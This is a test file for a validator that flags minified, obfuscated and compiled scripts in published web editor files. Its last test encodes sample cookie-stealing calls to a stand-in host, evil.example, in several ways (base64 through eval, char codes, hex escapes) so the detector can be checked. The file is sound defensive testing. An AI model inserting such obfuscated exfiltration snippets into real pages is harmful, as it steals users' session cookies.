import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isPublishedWebFile, minificationReason, minifiedWebFiles } from '../src/validate/webCode.js';

// Readable editor code, with a long hand-written line like those in real cards.
const readable = [
  'const editorMode = 0;',
  ...Array.from({ length: 60 }, (_, i) => `function update${i}(value) {\n  document.getElementById('field-${i}').textContent = String(value);\n}`),
  `function modeLabels(){${Array.from({ length: 12 }, (_, i) => `$('section-${i}').hidden=editorMode!==${i};`).join('')}}`,
].join('\n');

// What a minifier makes of similar code: short names, everything on one line.
const minified = Array.from({ length: 80 }, (_, i) => `function n${i}(e){const t=document.getElementById("f${i}");t.textContent=String(e),t.hidden=!e}`).join(';');
// Whitespace-only minification keeps names but still joins every line.
const whitespaceOnly = readable.replace(/\n\s*/g, '');

test('published files are the web editor and custom panels', () => {
  assert.equal(isPublishedWebFile('releases/42_card/web/index.html'), true);
  assert.equal(isPublishedWebFile('releases/42_card/dist/assets/app.js'), true);
  assert.equal(isPublishedWebFile('releases/42_card/panels/front.svg'), true);
  assert.equal(isPublishedWebFile('releases/42_card/src/main.js'), false);
  assert.equal(isPublishedWebFile('releases/42_card/README.md'), false);
});

test('readable scripts pass, minified and obfuscated ones do not', () => {
  assert.equal(minificationReason('web/app.js', readable), '');
  assert.equal(minificationReason('web/app.js', minified), 'minified script');
  assert.equal(minificationReason('web/app.js', whitespaceOnly), 'minified script');
  assert.equal(minificationReason('web/app.js', `var _0x3f2a=['log'];${readable}`), 'obfuscated script');
  assert.equal(minificationReason('web/app.js', `${readable}\n//# sourceMappingURL=app.js.map`), 'built script with a source map');
  assert.equal(minificationReason('web/short.js', 'a();b();'), '', 'too short to judge');
});

test('inline scripts in HTML and SVG are checked; markup and styles are not', () => {
  assert.equal(minificationReason('web/index.html', `<html><body><script>${readable}</script></body></html>`), '');
  assert.equal(minificationReason('web/index.html', `<html><body><script>${minified}</script></body></html>`), 'minified script');
  assert.equal(minificationReason('panels/front.svg', `<svg><script>${minified}</script></svg>`), 'minified script');
  const pathData = `<svg><path d="${'M1,2c0,.2.05.36.17.48'.repeat(200)}"/></svg>`;
  assert.equal(minificationReason('panels/front.svg', pathData), '', 'long path data is not code');
  assert.equal(minificationReason('web/style.css', `.a{color:red}`.repeat(500)), '', 'dense CSS runs nothing');
});

test('compiled and .min files always need review', () => {
  assert.equal(minificationReason('web/dsp.wasm', ''), 'compiled WebAssembly');
  assert.equal(minificationReason('web/vendor.min.js', readable), 'minified file');
  assert.equal(minificationReason('web/vendor.min.css', ''), 'minified file');
});

test('only added or modified published files are checked', () => {
  const files = {
    'releases/42_card/web/app.js': minified,
    'releases/42_card/web/ok.js': readable,
    'releases/42_card/src/app.js': minified,
  };
  const found = minifiedWebFiles([
    { status: 'M', path: 'releases/42_card/web/app.js' },
    { status: 'A', path: 'releases/42_card/web/ok.js' },
    { status: 'A', path: 'releases/42_card/src/app.js' },
    { status: 'D', path: 'releases/42_card/web/old.min.js' },
    { status: 'A', path: 'releases/42_card/web/dsp.wasm' },
  ], file => files[file] ?? null);
  assert.deepEqual(found, [
    { path: 'releases/42_card/web/app.js', reason: 'minified script' },
    { path: 'releases/42_card/web/dsp.wasm', reason: 'compiled WebAssembly' },
  ]);
});

test('obfuscated scripts need review, whatever technique they use', () => {
  const payload = Buffer.from("fetch('https://evil.example/?c='+document.cookie)").toString('base64');
  const samples = {
    'dynamically evaluated code': [`eval(atob("${payload}"));`, `const run = new Function(atob("${payload}")); run();`, `Function('return this')();`],
    'JSFuck-encoded script': ['[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]()'],
    'character-code-encoded strings': [`setTimeout(String.fromCharCode(${[...'fetch(document.cookie)'].map(c => c.charCodeAt(0)).join(',')}));`],
    'escape-encoded strings': [`fetch("${[...'https://evil.example/x'].map(c => `\\x${c.charCodeAt(0).toString(16)}`).join('')}");`],
    'obfuscated script': [
      `var _0x1a2b3c = ['log']; ${readable}`,
      // javascript-obfuscator's shape: bracketed property names and hex numbers throughout.
      Array.from({ length: 80 }, (_, i) => `function update${i}(b) {\n  document['getElementById']('f')['textContent'] = b + 0x${(i + 1).toString(16)};\n}`).join('\n'),
    ],
    'minified script': [
      // Renamed variables with the layout kept.
      Array.from({ length: 120 }, (_, i) => `function u${i}(e) {\n  const t = document.getElementById('field');\n  t.textContent = String(e + ${i});\n}`).join('\n'),
    ],
  };
  for (const [reason, codes] of Object.entries(samples)) {
    for (const code of codes) assert.equal(minificationReason('web/app.js', code), reason, code.slice(0, 60));
  }
  // Method calls named eval are not dynamic code.
  assert.equal(minificationReason('web/app.js', `${readable}\nmodel.eval(input);`), '');
});
